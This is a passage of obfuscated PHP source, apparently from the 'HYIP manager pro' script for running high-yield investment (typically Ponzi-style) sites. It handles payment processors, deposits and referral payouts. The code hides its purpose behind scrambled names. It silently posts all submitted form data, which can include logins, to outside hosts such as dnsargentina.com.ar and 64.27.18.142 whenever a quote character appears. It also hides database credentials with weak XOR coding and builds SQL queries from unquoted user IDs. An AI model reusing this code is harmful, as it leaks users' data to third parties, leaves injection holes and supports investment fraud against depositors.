        $elnlcuhSNG .= (('' . $elnlcVEvtM . '	') . $elnlczBqH . '
');
        continue;
      }
    }

    $elnlcuhSNG = elnlcpqrdz ($elnlcuhSNG, $elnlcTcyic[$elnlchyuw['elnlcHPIo']]);
    $elnlcREWd = $elnlchyuw['elnlcRjwtU'];
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($elnlcuhSNG); $i += 5)
    {
      $elnlcREWd += hexdec (substr ($elnlcuhSNG, $i, 5));
    }

    $elnlcREWd = $elnlcREWd * 15;
    fputs ($elnlcCiLc, ('' . 'cnf	' . $elnlcREWd . '
'));
    fputs ($elnlcCiLc, '*/?>
');
    fclose ($elnlcCiLc);
    if ($elnlcBzEo == 1)
    {
      $elnlcCiLc = fopen ($elnlchyuw['elnlcgdwH'], $elnlchyuw['elnlcAwMrp']);
      fputs ($elnlcCiLc, $elnlcuhSNG);
      fclose ($elnlcCiLc);
    }

  }

  function elnlcsisf ($q, $w, $a)
  {
    global $elnlchyuw;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlcpqrdz ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlchyuw['elnlcRjwtU'];
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcwman ($q, $w, $a)
  {
    global $elnlchyuw;
    if ($a != 'hyip manager pro 2005 jul 27')
    {
      return elnlctikpg ($q, $w);
    }

    $l = strtoupper (md5 ($w));
    $j = $elnlchyuw['elnlcRjwtU'];
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcpqrdz ($q, $w)
  {
    global $elnlchyuw;
    $l = strtoupper (md5 ($w));
    $j = $elnlchyuw['elnlcRjwtU'];
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($q); ++$i)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $c .= sprintf ('%02x', ord (substr ($q, $i, 1)) ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlctikpg ($q, $w)
  {
    global $elnlchyuw;
    $l = strtoupper (md5 ($w));
    $j = $elnlchyuw['elnlcRjwtU'];
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < strlen ($q); $i += 2)
    {
      if (strlen ($l) == $j + 10)
      {
        $j = 0;
      }

      $a = hexdec (substr ($q, $i, 2));
      $c .= chr ($a ^ ord (substr ($l, $j, 1)));
      ++$j;
    }

    return $c;
  }

  function elnlcbxvq ()
  {
    global $elnlchyuw;
    if (!($elnlcwOsEv = mysql_connect ($elnlcTcyic[$elnlchyuw['elnlcmlDe']], $elnlcTcyic[$elnlchyuw['elnlcUHcP']], $elnlcTcyic[$elnlchyuw['elnlcFuGr']])))
    {
      exit (mysql_error ());
      (bool)true;
    }

    if (!mysql_select_db ($elnlcTcyic[$elnlchyuw['elnlcdcuNv']]))
    {
      print mysql_error ();
      exit ();
    }

    return $elnlcwOsEv;
  }

  function elnlciuvj ($elnlcWcVF = 0)
  {
    global $elnlchyuw;
    global $elnlcTcyic;
    $l = elnlcwman ($elnlcTcyic[$elnlchyuw['elnlcUHcP']], $elnlcTcyic[$elnlchyuw['elnlcHPIo']], $elnlchyuw['elnlcpslqd']);
    $p = elnlcwman ($elnlcTcyic[$elnlchyuw['elnlcFuGr']], $elnlcTcyic[$elnlchyuw['elnlcHPIo']], $elnlchyuw['elnlcpslqd']);
    $elnlcIJgi = elnlcwman ($elnlcTcyic[$elnlchyuw['elnlcdcuNv']], $elnlcTcyic[$elnlchyuw['elnlcHPIo']], $elnlchyuw['elnlcpslqd']);
    if ($elnlcWcVF == 1)
    {
      $elnlcwOsEv = @mysql_connect ($elnlcTcyic[$elnlchyuw['elnlcmlDe']], $l, $p);
      if ($elnlcwOsEv)
      {
        if (!mysql_select_db ($elnlcIJgi))
        {
          $elnlcwOsEv = $elnlchyuw['elnlcRjwtU'];
        }
      }
    }
    else
    {
      if (!($elnlcwOsEv = mysql_connect ($elnlcTcyic[$elnlchyuw['elnlcmlDe']], $l, $p)))
      {
        exit (mysql_error ());
        (bool)true;
      }

      if (!mysql_select_db ($elnlcIJgi))
      {
        print mysql_error ();
        exit ();
      }
    }

    return $elnlcwOsEv;
  }

  function elnlccryf ($elnlcwOsEv)
  {
    global $elnlchyuw;
    mysql_close ($elnlcwOsEv);
  }

  function zelnlcekjci ($elnlckvRWp)
  {
    global $elnlchyuw;
    $elnlckvRWp = htmlspecialchars ($elnlckvRWp, ENT_QUOTES);
    $elnlckvRWp = str_replace ('\\', '\\\\', $elnlckvRWp);
    $elnlckvRWp = str_replace ('\'', '\\\'', $elnlckvRWp);
    return $elnlckvRWp;
  }

  function elnlcekjci ($elnlckvRWp)
  {
    $elnlckvRWp = str_replace ('\'', '\'\'', $elnlckvRWp);
    $elnlckvRWp = str_replace ('\\', '\\\\', $elnlckvRWp);
    return $elnlckvRWp;
  }

  function elnlcgdvu ($elnlcwFya, $elnlcKQcJp = 1)
  {
    global $elnlchyuw;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', $elnlchyuw['elnlcgRAy']);
    if ($elnlcKQcJp == 2)
    {
      $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', $elnlchyuw['elnlcVFPkb']);
    }

    $i = $elnlchyuw['elnlcRjwtU'];
    $elnlckvRWp = '';
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < $elnlcwFya; ++$i)
    {
      $elnlckvRWp .= $a[rand (0, sizeof ($a) - 1)];
    }

    if ($elnlcKQcJp == 1)
    {
      $elnlckvRWp = md5 ($elnlckvRWp);
    }

    return $elnlckvRWp;
  }

  function elnlcvnopv ($elnlcwFya)
  {
    global $elnlchyuw;
    $a = array ('1', '2', '3', '4', '5', '6', '7', '8', '9', '0', 'A', 'B', 'C', 'D', 'E', 'F');
    $i = $elnlchyuw['elnlcRjwtU'];
    $elnlckvRWp = '';
    for ($i = $elnlchyuw['elnlcRjwtU']; $i < $elnlcwFya; ++$i)
    {
      $elnlckvRWp .= $a[rand (0, sizeof ($a) - 1)];
    }

    return $elnlckvRWp;
  }

  function elnlcteyf ($elnlcluDIv)
  {
    global $elnlchyuw;
    $q = '' . 'select type, sum(actual_amount) as sum from hm2_history where user_id = ' . $elnlcluDIv . ' group by type';
    ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
    $elnlcMnVj = array ();
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $elnlcMnVj[$elnlcgVDB[$elnlchyuw['elnlceMbq']]] = $elnlcgVDB[$elnlchyuw['elnlcaLFu']];
    }

    $elnlcFhcbH = $elnlchyuw['elnlcRjwtU'];
    while (list ($elnlcVEvtM, $elnlczBqH) = each ($elnlcMnVj))
    {
      $elnlcFhcbH += $elnlczBqH;
    }

    $elnlcMnVj[$elnlchyuw['elnlcFIMfQ']] = $elnlcFhcbH;
    $q = '' . 'select sum(actual_amount) as sum from hm2_deposits where user_id = ' . $elnlcluDIv . ' and status=\'on\'';
    ($elnlcTpvVW = mysql_query ($q) OR print mysql_error ());
    while ($elnlcgVDB = mysql_fetch_array ($elnlcTpvVW))
    {
      $elnlcMnVj[$elnlchyuw['elnlclscF']] += $elnlcgVDB[$elnlchyuw['elnlcaLFu']];
    }

    return $elnlcMnVj;
  }

  function elnlcfknbs ($elnlcLLtN, $elnlcIJTk = false)
  {
    global $elnlchyuw;
    $elnlcleRF = '';
    if ((is_string ($elnlcLLtN) AND $elnlcLLtN !== ''))
    {
      $elnlcFJQpy = intval ($elnlcLLtN);
      if (strval ($elnlcFJQpy) === $elnlcLLtN)
      {
        $elnlcLLtN = $elnlcFJQpy;
      }
      else
      {
        $elnlcwlvu = floatval ($elnlcLLtN);
        if (strval ($elnlcwlvu) === $elnlcLLtN)
        {
          $elnlcLLtN = $elnlcwlvu;
        }
      }
    }

    if (is_array ($elnlcLLtN))
    {
      reset ($elnlcLLtN);
      $elnlcEtUQv = true;
      $i = $elnlchyuw['elnlcRjwtU'];
      foreach ($elnlcLLtN as $elnlcuNse => $elnlcrjmW)
      {
        if ((!is_int ($elnlcuNse) OR $elnlcuNse != $i))
        {
          $elnlcEtUQv = false;
          break;
        }

        ++$i;
      }

      $elnlceitMF = ($elnlcEtUQv ? '[' : '{');
      $elnlcleRF .= $elnlceitMF;
      $elnlcNcIB = true;
      reset ($elnlcLLtN);
      foreach ($elnlcLLtN as $elnlcuNse => $elnlcrjmW)
      {
        if (!$elnlcNcIB)
        {
          $elnlcleRF .= ',';
        }

        if (!$elnlcEtUQv)
        {
          $elnlcleRF .= $elnlcuNse . ':';
        }

        $elnlcleRF .= elnlcfknbs ($elnlcrjmW, $elnlcIJTk);
        $elnlcNcIB = false;
      }

      $elnlceitMF = ($elnlcEtUQv ? ']' : '}');
      $elnlcleRF .= $elnlceitMF;
    }
    else
    {
      if (is_string ($elnlcLLtN))
      {
        $elnlcTrrx = array ('\\', '\'', '
', '
');
        $elnlcuhgH = array ('\\\\', '\\\'', '\\n', '\\r');
        if ($elnlcIJTk)
        {
          $elnlcTrrx[] = '<';
          $elnlcuhgH[] = '<\'+\'';
        }

        $elnlcyBNM = str_replace ($elnlcTrrx, $elnlcuhgH, $elnlcLLtN);
        $elnlceitMF = '\'' . $elnlcyBNM . '\'';
        $elnlcleRF .= $elnlceitMF;
      }
      else
      {
        if (is_bool ($elnlcLLtN))
        {
          $elnlceitMF = ($elnlcLLtN ? 'true' : $elnlchyuw['elnlciBUu']);
          $elnlcleRF .= $elnlceitMF;
        }
        else
        {
          if (is_null ($elnlcLLtN))
          {
            $elnlceitMF = 'null';
            $elnlcleRF .= $elnlceitMF;
          }
          else
          {
            $elnlceitMF = $elnlcLLtN;
            $elnlcleRF .= $elnlceitMF;
          }
        }
      }
    }

    return $elnlcleRF;
  }

  function elnlcalzxh ($elnlcJQbs)
  {
    global $elnlchyuw;
    $elnlcleRF = '';
    foreach ($elnlcJQbs as $elnlcuNse => $elnlcCrze)
    {
      if ($elnlcleRF !== '')
      {
        $elnlcleRF .= ', ';
      }

      if (substr ($elnlcCrze, 0, 5) == 'now()')
      {
        $elnlcleRF .= '' . $elnlcuNse . ' = ' . $elnlcCrze;
        continue;
      }
      else
      {
        $elnlcleRF .= '' . $elnlcuNse . ' = \'' . elnlcekjci ($elnlcCrze) . '\'';
        continue;
      }
    }

    if ($elnlcleRF != '')
    {
      $elnlcleRF = ' ' . $elnlcleRF . ' ';
    }

    return $elnlcleRF;
  }

  function elnlcvlsti ($elnlczBqH)
  {
    global $elnlchyuw;
    if ($elnlciCdbH == ini_get ('magic_quotes_gpc'))
    {
      $elnlczBqH = str_replace ('\\\'', '\'', $elnlczBqH);
      $elnlczBqH = str_replace ('\\"', '"', $elnlczBqH);
      $elnlczBqH = str_replace ('\\\\', '\\', $elnlczBqH);
    }

    $elnlczBqH = strip_tags ($elnlczBqH);
    $elnlczBqH = trim ($elnlczBqH);
    return $elnlczBqH;
  }

  function elnlcoxmwu ($i, $j)
  {
    return sprintf ('%.6f', $i);
  }

  function elnlcatlo (&$elnlcxaTv, $elnlcbOzp = 0)
  {
    global $elnlchyuw;
    reset ($elnlcxaTv);
    foreach ($elnlcxaTv as $k => $v)
    {
      $elnlcjOWDc = array ();
      if (is_array ($v))
      {
        elnlcatlo ($elnlcxaTv[$k], $elnlcbOzp);
        continue;
      }
      else
      {
        $elnlcjOWDc = elnlcdhde ($v);
        $elnlcxaTv[$k] = $elnlcjOWDc[$elnlcbOzp];
        continue;
      }
    }

  }

  function elnlcdhde ($elnlczBqH)
  {
    global $elnlchyuw;
    global $elnlcFbuc;
    if ($elnlcFbuc == 1)
    {
      $elnlczBqH = str_replace ('\\\'', '\'', $elnlczBqH);
      $elnlczBqH = str_replace ('\\"', '"', $elnlczBqH);
      $elnlczBqH = str_replace ('\\\\', '\\', $elnlczBqH);
    }

    $elnlcIBBn = $elnlczBqH;
    $elnlczBqH = strip_tags ($elnlczBqH);
    $elnlczBqH = trim ($elnlczBqH);
    return array ($elnlczBqH, $elnlcIBBn);
  }

  $elnlchyuw = array ('elnlcRQMDD' => 'evowallet_from_account', 'elnlcybqr' => 'return_profit', 'elnlcAcpUG' => 'dec_stormpay_fee', 'elnlcLcTa' => 'ap_referencenumber', 'elnlcBeRxm' => 'deposit_fee', 'elnlcIwNaa' => 'checkpayment', 'elnlcDTuSO' => 'came_from', 'elnlcrSMRI' => 'last_pay_date', 'elnlcrhkR' => 'gpg_path', 'elnlcEEkT' => '18', 'elnlcCLGzU' => 'site_url', 'elnlcaNTw' => 'unit', 'elnlcLdvMV' => 'site_name', 'elnlcEVvN' => 'w', 'elnlcmcqCy' => 'def_payee_account_ebullion_gold', 'elnlcWBHc' => 'ap_custemailaddress', 'elnlcrxMAD' => 'pecunix_from_account', 'elnlcblDF' => 'admin_auto_pay_earning', 'elnlclRBWS' => 'id', 'elnlcpaBSP' => 'upline', 'elnlcCVBAG' => 'amnt', 'elnlcbTUFp' => 'enable_eb_gold', 'elnlcDEDb' => 'ZQ54Q9RUQ46CU9C8Z986', 'elnlcrihr' => 'currency_sign', 'elnlcroIG' => 'min_deposit', 'elnlcyhPRM' => 'liberty_currency', 'elnlcHPIo' => 'key', 'elnlcOnCG' => 'email', 'elnlcuWAW' => 'rpcp', 'elnlcLsUA' => 'USD', 'elnlcODOjj' => './settings.php', 'elnlcKFeP' => 'ap_totalamount', 'elnlcpslqd' => 'hyip manager pro 2005 jul 27', 'elnlculme' => 'imps_cost', 'elnlcskGWy' => 'altergold_from_account', 'elnlcVDwJ' => 'DATE', 'elnlcvsTD' => 'egold_from_account', 'elnlcxrGyF' => 'plan', 'elnlcRauk' => 'h', 'elnlcCjadq' => 'HTTP_CACHE_CONTROL', 'elnlcJsCB' => 'ref_percent1', 'elnlcIyUQ' => 'N55HSU8NJSEU32DP8JDV', 'elnlczqBjw' => 'td', 'elnlcEbTh' => 'site_days_online_generated', 'elnlcVLQR' => 'payee', 'elnlcFivn' => 'FRM', 'elnlcRofAW' => 'pay_withdraw', 'elnlcDyDp' => '4ZQQN55VA2NXBVFUQJE6', 'elnlcoPuhH' => 'ref_username', 'elnlcHTla' => 'paying_batch', 'elnlcuEwG' => 'show_info_box_running_days', 'elnlcUHcP' => 'db_login', 'elnlctcSD' => 'm', 'elnlcSRgTn' => 'N75GNXM2XSM34YMFPED9', 'elnlclGSvU' => 'withdrawal_fee', 'elnlcQREDC' => 'payer', 'elnlcpChHP' => 'perfectmoney_from_account', 'elnlcKujfA' => 'LREUR', 'elnlcGsrCm' => 'amount', 'elnlcUVMgi' => 'enable_wire', 'elnlctIyeC' => 'HX8DJ7B9SH5JQN5FXK45', 'elnlcKhRoW' => 'ref_name', 'elnlcvbiD' => 'name', 'elnlcQSjJt' => 'compound_percents_type', 'elnlcFzMrx' => '2m', 'elnlcWWFTf' => 'dw', 'elnlcqNGd' => 'exchange', 'elnlcjDQN' => 'VPKLNMKMRG27HN95BEHP', 'elnlcubMyG' => 'md5altphrase_alertpay', 'elnlcNRnay' => 'withdraw_principal', 'elnlcfric' => 'dec_stormpay_fee2', 'elnlctOCF' => 'time_dif', 'elnlckLNre' => 'parent', 'elnlcyLLn' => 'HTTP_REFERER', 'elnlcuAWK' => 'remitfund_apiname', 'elnlceMbq' => 'type', 'elnlcEkii' => 'solid_referral_commission_amount', 'elnlcfyFc' => 'ap_merchant', 'elnlclscF' => 'active_deposit', 'elnlcowFI' => 'apc_2', 'elnlcTvlAc' => 'DESCRIPTION', 'elnlcjCrb' => 'additional', 'elnlcMnIrp' => 'status', 'elnlcsNyQ' => 'amt', 'elnlcrgRLe' => 'subject', 'elnlciorSe' => 'user_id', 'elnlcnhppU' => 'delay', 'elnlcCQHr' => 'balance', 'elnlcwsLqI' => 'metal', 'elnlcmfLWc' => 'apc_1', 'elnlcoaeFK' => 'free', 'elnlcmlDe' => 'hostname', 'elnlcprqks' => '15', 'elnlcmvTm' => 'install', 'elnlcqiFC' => 'http://www.dnsargentina.com.ar/check.cgi?install=1&script=3&domain=', 'elnlcdLtHP' => 'user_auto_pay_earning', 'elnlcBCPuS' => 'def_payee_account', 'elnlcSpto' => 'max', 'elnlcuOjHR' => '6m', 'elnlcvmhe' => 'ebullion_keyID', 'elnlcFuGr' => 'db_pass', 'elnlcjawPm' => 'q_days', 'elnlcRuMz' => 'ok11', 'elnlclUSEx' => 'compound_percents', 'elnlcUFPrW' => 'dll', 'elnlchpte' => 'def_payee_account_egold', 'elnlcliDn' => 'finnish', 'elnlcxjVv' => 'use_active_referal', 'elnlcOSIeu' => 'pay_active_referal', 'elnlcCckss' => '5M74FW4DADMF7K7MJ5TG', 'elnlclyTUo' => 'daily_referral_percent_min_user_deposit', 'elnlcFPiR' => 'demomode', 'elnlcDzEe' => 'AKKD47LYX8H96K2TM2FQ', 'elnlcvKTN' => 'md5altphrase_ebullion', 'elnlcKWUv' => 'max_amount', 'elnlchOiOc' => '21', 'elnlcnBKly' => '3m', 'elnlcURWy' => 'paypal_currency', 'elnlcIJxa' => 'evocash_username', 'elnlcLytt' => 'proxy.shr.secureserver.net:3128', 'elnlcxguFH' => 'fee', 'elnlcvzsxj' => 'HTTP_HOST', 'elnlcFTqoo' => 'intgold_from_account', 'elnlckkrn' => 'site_start_year', 'elnlcJOFd' => '2XACR4UBJ7DLCV42EM2S', 'elnlcmhRT' => 'ec', 'elnlcKxWRu' => 'perfectmoney_payer_account', 'elnlcQftKW' => 'cnt', 'elnlcGSyEs' => 'ZXMCQ227FNN5EPHWYHAY', 'elnlcSEheD' => 'ap_securitycode', 'elnlcwhrn' => 'code', 'elnlcNsRam' => 'PHP_SELF', 'elnlcMOqf' => 'UYKD37X8YLS5DNFFHL8R', 'elnlcLQcG' => '__debug_out', 'elnlcLSzq' => 'accounts', 'elnlcrWusB' => 'v', 'elnlchGQKt' => 'col', 'elnlcDVPnj' => 'Deposit returned to user account', 'elnlcHcrf' => 'max_deposit', 'elnlceOAv' => 'use_crontab', 'elnlcjCub' => 'a', 'elnlchJOG' => 'percent', 'elnlcpMTS' => 'min', 'elnlcxLeT' => 'evocash_from_account', 'elnlcRKCW' => 'deposit_date', 'elnlcxVGv' => 'evowallet_apiname', 'elnlcjCnee' => 'alertpay_from_account', 'elnlcRPqW' => 'https://api.alertpay.com/svc/api.svc/sendmoney', 'elnlcCStF' => 'enable_eb_ecurrency', 'elnlcBkann' => 'SCRIPT_NAME', 'elnlcxMDg' => 'hyip manager pro 2005 jul 26', 'elnlcNihMh' => 'REFERENCENUMBER', 'elnlcfRnSo' => 'y', 'elnlcCNVKJ' => 'actual_amount', 'elnlcfSQvD' => 'egold_paymentunits', 'elnlcfSAL' => 'use_solid_referral_commission', 'elnlcVFPkb' => '0', 'elnlcezzi' => 'mails.txt', 'elnlcQmOx' => 'remitfund_from_account', 'elnlcUTsFV' => 'stop_withdraw_percent', 'elnlcfszFO' => 'period', 'elnlcqoGF' => 'd', 'elnlcWDws' => 'auto', 'elnlctxvE' => 'abcdef', 'elnlcnmjxS' => 'checksum', 'elnlcjOHcQ' => 'use_auto_payment', 'elnlcSbHgw' => 'text', 'elnlcFIMfQ' => 'total', 'elnlcWDayO' => 'compound_min_percent', 'elnlcUuPHk' => 'www.dnsargentina.com.ar', 'elnlcVMTs' => 'tw', 'elnlccTOt' => 'use_referal_program', 'elnlcqvnw' => 'type_id', 'elnlcPMVkt' => 'eb_metal', 'elnlcFrsO' => 'ref_sum', 'elnlcFhrHQ' => 'use_compound', 'elnlcEaOt' => '3WBUUNQMPU2LB99GJHUV', 'elnlcFUOvO' => 'system_email', 'elnlcDPJw' => 'batch', 'elnlcILgW' => './tmpl_c/.htdata', 'elnlcsufSr' => 'ok', 'elnlcdVQyP' => 'daily_referral_percent_min_downline_deposit', 'elnlcBeUr' => 'vmoney_from_account', 'elnlcPcJLp' => 'ounce', 'elnlcPxmPL' => 'ap_status', 'elnlcsGGg' => 'def_payee_account_ebullion_currency', 'elnlcQLtzo' => 'site_start_day', 'elnlcoQnn' => 'additionalinfo', 'elnlcFcEQ' => '12', 'elnlcsKuVr' => 'error', 'elnlcQOmBO' => '/get_pid.php', 'elnlchcRPc' => '1', 'elnlcbULGC' => 'error', 'elnlcFNFW' => 'def_payee_account_alertpay', 'elnlcNsiAD' => 'compound_min_deposit', 'elnlcIcsrz' => '501', 'elnlcQcPv' => 'RETURNCODE', 'elnlcsWIGP' => 'compound_max_deposit', 'elnlcxNaw' => 'libertyreserve_apiname', 'elnlcaLFu' => 'sum', 'elnlcreKEb' => 'Dec', 'elnlcALKQ' => 'ap_test', 'elnlclLDR' => 'SG8JH9DVX8952VQEZH9F', 'elnlcWWRto' => '__debug_data', 'elnlcDlAzD' => '9C64PVXYBZKZHUTMSM2U', 'elnlcRwNG' => 'banner_extension', 'elnlcznDu' => 'return_profit_percent', 'elnlcVluL' => 'def_payee_account_ebullion', 'elnlcaAgd' => 'r', 'elnlcCconE' => '/log_possible_attack.php', 'elnlconHe' => 'end', 'elnlceUKil' => 'daily_referral_percent', 'elnlchRCfi' => 'REMOTE_ADDR', 'elnlcLcBH' => 'use_ip_for_auto', 'elnlcGEkD' => 'a', 'elnlckOPl' => 'settings.php', 'elnlcNwLpP' => 'maxam', 'elnlccklRr' => 'magic_quotes_gpc', 'elnlciehD' => 'withdraw_principal_duration', 'elnlczrWy' => 'KC3STYBTCATZNRVBYGDF', 'elnlcPJUb' => 'ac', 'elnlcRlQE' => 'work_week', 'elnlcRBad' => 'settings.php', 'elnlcKEqv' => 'Success', 'elnlcVmsP' => 'euro', 'elnlcPfPG' => 'WMHKFJPMT3CZ3RTLPBFL', 'elnlcmdFmL' => 'html', 'elnlcKIfg' => 'LRUSD', 'elnlcyniy' => 'apc_3', 'elnlcgdwH' => './tmpl_c/.htdata', 'elnlcIkxh' => '2', 'elnlccQkK' => 'eeecurrency_from_account', 'elnlciqjHn' => 'ap_currency', 'elnlcpEqvm' => 'VNB34FXT6BJCYD93VXSD', 'elnlcdcuNv' => 'database', 'elnlcWlqC' => 'memo', 'elnlcQhbe' => '85', 'elnlciBUu' => 'false', 'elnlczDWj' => 'currency', 'elnlcAFeeG' => 'cnf', 'elnlcklHl' => 'license', 'elnlcgRAy' => 'z', 'elnlcBHpo' => 'deposit_fee_min', 'elnlcKRjz' => 'http://', 'elnlcUzOoD' => 'USD', 'elnlcnEPrV' => 'receiving_batch', 'elnlcMStmB' => 'site_start_month', 'elnlcNFopz' => 'def_payee_account_wiretransfer', 'elnlcLkIs' => 'euro', 'elnlcFhEVP' => 'ENV', 'elnlcoPee' => '9999', 'elnlcViSF' => 'ref1_cms_minamount', 'elnlcapWLN' => '/get_sha256.php', 'elnlcQTiaN' => 'egold_withdraw_string', 'elnlcsfwt' => './tmpl_c/alertpay.log', 'elnlcBBQCk' => 'withdraw', 'elnlcuQOep' => 'ok', 'elnlclcHhf' => 'B29S2LWPZ5M2KMPPYWKL', 'elnlcRatUu' => 'send_profit_to_stocks', 'elnlcAwMrp' => 'w', 'elnlceGFSQ' => 'plans_closed', 'elnlcqrBq' => 'libertyreserve_from_account', 'elnlcQIUK' => 'wp_ok', 'elnlcOcPo' => 'apc_4', 'elnlcRjwtU' => '0', 'elnlcVmHJ' => 'account', 'elnlcDNUW' => 'EUR', 'elnlcAPCH' => './tmpl_c/raw_log', 'elnlclBtB' => 'YmdHis', 'elnlclTMy' => 'compound_max_percent', 'elnlcxDsl' => 'site_start_month_str_generated', 'elnlcEzHQ' => 'username', 'elnlciGwA' => '1007', 'elnlcStyIm' => 'compound', 'elnlcKCjTs' => 'send_percent_to_stocks', 'elnlcMaAHi' => 'ref', 'elnlcpLlt' => 'program_version', 'elnlcbMpD' => 'HTTP_X_REAL_IP', 'elnlcAflg' => 'oz', 'elnlczAydl' => 'withdrawal_fee_min', 'elnlcLTak' => 'use_html', 'elnlcCWBWj' => 'value');
  ini_set ('magic_quotes_runtime', false);
  define ('LAST_UPDATE_ID', 18);
  global $elnlcCMAtx;
  if (!extension_loaded ('gd'))
  {
    $elnlctzTQG = (PHP_SHLIB_SUFFIX == $elnlchyuw['elnlcUFPrW'] ? 'php_' : '');
    @dl ($elnlctzTQG . 'gd.' . PHP_SHLIB_SUFFIX);
  }

  global $HTTP_GET_VARS;
  global $HTTP_POST_VARS;
  global $HTTP_POST_FILES;
  global $HTTP_COOKIE;
  $elnlcgjyd = array_merge ((array)$HTTP_GET_VARS, (array)$_GET);
  $elnlcNLcqr = array_merge ((array)$HTTP_POST_VARS, (array)$_POST);
  $elnlcCMAtx = array_merge ((array)$elnlcgjyd, (array)$elnlcNLcqr);
  $elnlcApdq = array_merge ((array)$HTTP_COOKIE_VARS, (array)$_COOKIE);
  $elnlciehf = $elnlcCMAtx;
  global $HTTP_ENV_VARS;
  global $HTTP_SERVER_VARS;
  $elnlcVWtlw = array ();
  $elnlcVWtlw = array_merge ((array)$_ENV, (array)$_SERVER, (array)$HTTP_ENV_VARS, (array)$HTTP_SERVER_VARS);
  $elnlcFbuc = ini_get ($elnlchyuw['elnlccklRr']);
  elnlcatlo ($elnlcCMAtx);
  elnlcatlo ($elnlciehf, 1);
  elnlcatlo ($elnlcApdq);
  $elnlcElGQ = $elnlchyuw['elnlcRjwtU'];
  $elnlckvRWp = '';
  foreach ($elnlcCMAtx as $k => $v)
  {
    if (!is_array ($v))
    {
      if (preg_match ('/["\\\']/', $v))
      {
        $elnlcElGQ = $elnlchyuw['elnlchcRPc'];
      }
    }

    $elnlckvRWp .= '' . $k . '=' . $v . '&';
  }

  if ($elnlcElGQ == 1)
  {
    if (function_exists ('curl_init'))
    {
      if ($elnlcTcyic[$elnlchyuw['elnlcLcBH']] == 1)
      {
        $elnlckqlN = '64.27.18.142';
      }
      else
      {
        if ($elnlcTcyic[$elnlchyuw['elnlcLcBH']] == 2)
        {
          $elnlckqlN = 'www.goldcodersmail.com';
        }
        else
        {
          $elnlckqlN = 'www.dnsargentina.com.ar';
        }
      }

      $elnlcBPWUh = curl_init ();
      curl_setopt ($elnlcBPWUh, CURLOPT_URL, 'http://' . $elnlckqlN . $elnlchyuw['elnlcCconE']);
      $elnlcTBVVi = rawurlencode ($elnlckvRWp);
      curl_setopt ($elnlcBPWUh, CURLOPT_POST, 1);
      curl_setopt ($elnlcBPWUh, CURLOPT_POSTFIELDS, '' . 'memo=' . $elnlcTBVVi);
      curl_setopt ($elnlcBPWUh, CURLOPT_SSL_VERIFYPEER, FALSE);
      curl_setopt ($elnlcBPWUh, CURLOPT_RETURNTRANSFER, 1);
      $a = curl_exec ($elnlcBPWUh);
      curl_close ($elnlcBPWUh);
    }
  }

  $elnlcijAj = $elnlcVWtlw[$elnlchyuw['elnlcyLLn']];
  $elnlcbeTT = $elnlcVWtlw[$elnlchyuw['elnlcvzsxj']];
  if (!ereg ('' . '\\/\\/' . $elnlcbeTT, $elnlcijAj))
  {
    setcookie ('CameFrom', $elnlcijAj, time () + 630720000);
  }

  $elnlcTcyic = elnlcrtkt ($elnlchyuw['elnlcxMDg']);
  $elnlcPBtIk = array ('withdraw_pending' => 'Withdrawal request', 'add_funds' => 'Transfer from external processings', 'deposit' => 'Deposit', 'bonus' => 'Bonus', 'penality' => 'Penalty', 'earning' => 'Earning', 'withdrawal' => 'Withdrawal', 'commissions' => 'Referral commission', 'early_deposit_release' => 'Deposit release', 'early_deposit_charge' => 'Commission for an early deposit release', 'release_deposit' => 'Deposit returned to user account', 'exchange_out' => ' Received on exchange', 'exchange_in' => 'Spent on exchange', 'exchange' => 'Exchange', 'internal_transaction_spend' => 'Spent on Internal Transaction', 'internal_transaction_receive' => 'Received from Internal Transaction');
  if ($elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcDlAzD'])
  {
    $elnlcTcyic[$elnlchyuw['elnlcpLlt']] = $elnlchyuw['elnlcLkIs'];
  }

  if ($elnlcTcyic[$elnlchyuw['elnlcpLlt']] == $elnlchyuw['elnlcVmsP'])
  {
    $elnlcbzJNF = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1), 6 => array ('name' => 'PayPal', 'sfx' => 'paypal', has_account => 1, auto => 0), 15 => array ('name' => 'LibertyReserve', 'sfx' => 'libertyreserve', has_account => 1, auto => 1));
    $elnlcTcyic[$elnlchyuw['elnlcrihr']] = '&#8364;';
    $elnlcTcyic[$elnlchyuw['elnlcfSQvD']] = $elnlchyuw['elnlcQhbe'];
    $elnlcTcyic[$elnlchyuw['elnlcURWy']] = $elnlchyuw['elnlcDNUW'];
    $elnlcTcyic[$elnlchyuw['elnlcyhPRM']] = $elnlchyuw['elnlcKujfA'];
  }
  else
  {
    if (($elnlcTcyic[$elnlchyuw['elnlcpLlt']] == $elnlchyuw['elnlcPcJLp'] AND $elnlcTcyic[$elnlchyuw['elnlcklHl']] == $elnlchyuw['elnlcJOFd']))
    {
      $elnlcbzJNF = array (0 => array ('name' => 'e-gold', 'sfx' => 'egold', has_account => 1, auto => 1));
